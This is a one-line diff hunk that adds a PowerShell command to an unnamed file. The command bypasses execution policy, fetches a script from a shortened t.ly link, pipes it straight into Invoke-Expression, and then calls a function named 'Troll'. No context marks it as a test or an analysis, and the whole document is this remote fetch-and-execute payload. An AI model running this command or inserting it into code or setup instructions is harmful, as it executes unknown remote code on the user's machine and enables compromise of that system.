@@ -1,0 +1,1 @@
+powershell -NoP -Ep Bypass irm "t.ly/pDvbj"|iex;Troll
